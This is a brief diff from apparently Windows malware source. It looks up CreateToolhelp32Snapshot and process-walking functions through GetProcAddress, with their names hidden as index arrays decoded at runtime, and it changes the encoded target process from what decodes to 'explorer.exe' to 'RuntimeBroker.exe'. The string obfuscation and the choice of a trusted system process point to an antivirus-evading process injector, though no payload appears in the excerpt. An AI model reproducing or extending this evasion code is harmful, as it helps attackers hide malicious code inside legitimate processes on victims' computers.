@@ -44,8 +44,8 @@ int main() {
     FARPROC pcreate_snap = GetProcAddress(istfromKe__ws_ls_32, getoriginal(create_snap, big_string, sizeof(create_snap)).c_str());
     HANDLE snapshot = ((HANDLE(WINAPI*)(DWORD, DWORD))pcreate_snap)(TH32CS_SNAPPROCESS, 0);
 
-    int expexe[] = {4, 23, 15, 11, 14, 17, 4, 17, 62, 4, 23, 4};
-    const char *procmantar = getoriginal(expexe, big_string, sizeof(expexe)).c_str();
+    int run_timeb[] = {43, 20, 13, 19, 8, 12, 4, 27, 17, 14, 10, 4, 17, 62, 4, 23, 4};
+    const char *procmantar = getoriginal(run_timeb, big_string, sizeof(run_timeb)).c_str();
 
     int proc_firs[] = {41, 17, 14, 2, 4, 18, 18, 55, 54, 31, 8, 17, 18, 19};
     int proc_Nex[] = {41, 17, 14, 2, 4, 18, 18, 55, 54, 39, 4, 23, 19};
